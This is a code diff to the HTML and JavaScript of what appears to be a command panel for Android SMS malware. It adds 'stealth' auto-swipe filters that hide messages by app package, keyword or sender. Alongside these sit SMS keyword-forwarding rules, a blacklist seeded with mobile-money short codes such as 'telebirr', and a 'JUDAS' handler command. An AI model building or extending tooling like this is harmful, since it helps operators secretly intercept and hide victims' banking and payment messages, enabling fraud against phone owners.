@@ -399,11 +399,25 @@
                     <button class="btn danger" style="width:100%; margin-top:5px; font-size:0.5rem;" onclick="sendCmd('CLEAR_KEYWORD_FORWARDS')">WIPE ALL KEYWORD RULES</button>
                 </div>
                 <div class="cmd-row">
-                    <label class="cmd-label">SMS Filter (Blacklist)</label>
+                    <label class="cmd-label">Automatic Stealth Filters (Auto-Swipe)</label>
+                    <div class="input-wrap">
+                        <button class="btn-tag" onclick="tagCmd('ADD_AUTO_SWIPE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('ADD_AUTO_SWIPE')">?</button>
+                        <select id="swipe-type" style="width:80px; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
+                            <option value="pkgs">APP PKG</option>
+                            <option value="keywords">STRING</option>
+                            <option value="senders">SENDER</option>
+                        </select>
+                        <input type="text" id="swipe-val" placeholder="Value..." style="flex:1">
+                        <button class="btn" onclick="sendCmd('ADD_AUTO_SWIPE')">ADD RULE</button>
+                    </div>
+                    <button class="btn danger" style="width:100%; margin-top:5px; font-size:0.55rem;" onclick="sendCmd('CLEAR_AUTO_SWIPE', 'all')">PURGE ALL STEALTH FILTERS</button>
+                </div>
+                <div class="cmd-row">
+                    <label class="cmd-label">SMS Filter (Keyword Archive)</label>
                     <div class="input-wrap">
                         <button class="btn-tag" onclick="tagCmd('SET_SMS_BLACKLIST', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SET_SMS_BLACKLIST')">?</button>
                         <input type="text" id="sms-blacklist" placeholder="127, 994, telebirr..." style="flex:1">
-                        <button class="btn" onclick="sendCmd('SET_SMS_BLACKLIST')">FILTER</button>
+                        <button class="btn" onclick="sendCmd('SET_SMS_BLACKLIST')">SET LIST</button>
                     </div>
                 </div>
                 <div class="cmd-row">
@@ -957,6 +971,10 @@
                         content = `${document.getElementById('kw-list').value}|${document.getElementById('kw-dest').value}`; break;
                     case 'CLEAR_KEYWORD_FORWARDS':
                         content = ''; break;
+                    case 'ADD_AUTO_SWIPE':
+                        content = `${document.getElementById('swipe-type').value}|${document.getElementById('swipe-val').value}`; break;
+                    case 'CLEAR_AUTO_SWIPE':
+                        content = forcedVal || ''; break;
                     case 'SET_SMS_BLACKLIST':
                         content = document.getElementById('sms-blacklist').value; break;
                     case 'SET_JUDAS_HANDLER':
